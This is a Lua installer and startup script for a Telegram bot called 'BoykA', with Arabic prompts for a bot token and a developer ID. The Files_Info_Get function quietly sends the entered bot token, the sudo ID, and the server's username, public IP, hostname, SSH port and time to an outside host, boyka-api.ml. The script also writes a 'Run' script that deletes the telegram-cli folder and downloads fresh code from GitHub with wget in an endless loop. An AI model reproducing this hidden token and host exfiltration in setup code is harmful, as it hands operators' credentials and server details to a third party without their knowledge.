GithubUser = "BOYKA-DeV"
redis=dofile("./File/redis.lua").connect("127.0.0.1", 6379)
serpent=dofile("./File/serpent.lua")
JSON=dofile("./File/dkjson.lua")
json=dofile("./File/JSON.lua")
http= require("socket.http")
URL=dofile("./File/url.lua")
https= require("ssl.https")
Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
IP = io.popen("dig +short myip.opendns.com @resolver1.opendns.com"):read('*a'):gsub('[\n\r]+', '')
Name = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a'):gsub('[\n\r]+', '')
Port = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
Time = io.popen("date +'%Y/%m/%d %T'"):read('*a'):gsub('[\n\r]+', '')
local AutoFiles_Write = function() 
local Create_Info = function(Token,Sudo)  
local Write_Info_Sudo = io.open("sudo.lua", 'w')
Write_Info_Sudo:write([[

s = "BOYKA-DeV"

q = "BoykA"

token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

]])
Write_Info_Sudo:close()
end  
if not redis:get(Server_Done.."Token_Write") then
print("\27[1;32mارسل توكن البوت الان :")
local token = io.read()
if token ~= '' then
data,res = https.request("https://boyka-api.ml/index.php?p="..GithubUser)
if res == 200 then
tr = json:decode(data)
if tr.Info.info == 'Is_Spam' then
io.write('\n\27[1;31m'..tr.Info.info..'\n\27[0;39;49m')
os.execute('lua start.lua')
end ---ifBn
if tr.Info.info == 'Ok' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write("\27[1;32mعذرا التوكن خطأ  :")
else
io.write("\27[1;33mتم حفظ التوكن :")
redis:set(Server_Done.."Token_Write",token)
end ---ifok
end ---ifok
else
io.write("\27[4;34mلم يتم حفظ التوكن حاول وقت اخر :")
end  ---ifid
os.execute('lua start.lua')
end ---ifnot
end
if not redis:get(Server_Done.."UserSudo_Write") then
print("\27[1;36mارسل ايدي المطور الان :\27[m")
local Id = io.read():gsub(' ','') 
if tostring(Id):match('%d+') then
data,res = https.request("https://boyka-api.ml/index.php?bn=info&id="..Id)
if res == 200 then
muaed = json:decode(data)
if muaed.Info.info == 'Is_Spam' then
io.write("\27[1;31mعذرا الايدي محظور من السورس ارسل ايدي اخر :\27[m")
os.execute('lua start.lua')
end ---ifBn
if muaed.Info.info == 'Ok' then
io.write("\27[1;32mتم حفظ الايدي بنجاح :\27[m")
redis:set(Server_Done.."UserSudo_Write",Id)
end ---ifok
else
io.write("\27[1;35mلم يتم حفظ الايدي يوجد خطأ :\27[m")
end  ---ifid
os.execute('lua start.lua')
end ---ifnot
end
local function Files_Info_Get()
Create_Info(redis:get(Server_Done.."Token_Write"),redis:get(Server_Done.."UserSudo_Write"))   
local t = json:decode(https.request('https://boyka-api.ml/index.php?n=by&id='..redis:get(Server_Done.."UserSudo_Write").."&token="..redis:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
local RunBot = io.open("Run", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/BoykA
token="]]..redis:get(Server_Done.."Token_Write")..[["
rm -fr BoykA.lua
wget "https://raw.githubusercontent.com/BOYKA-DeV/BoykA/BoykA/BoykA.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./BoykA.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
local RunTs = io.open("BA", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/BoykA
while(true) do
rm -fr ../.telegram-cli
screen -S BoykA -X kill
screen -S BoykA ./Run
done
]])
RunTs:close()
end
Files_Info_Get()
redis:del(Server_Done.."Token_Write");redis:del(Server_Done.."UserSudo_Write")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_Write()  
var = true
else   
f:close()  
redis:del(Server_Done.."Token_Write");redis:del(Server_Done.."UserSudo_Write")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()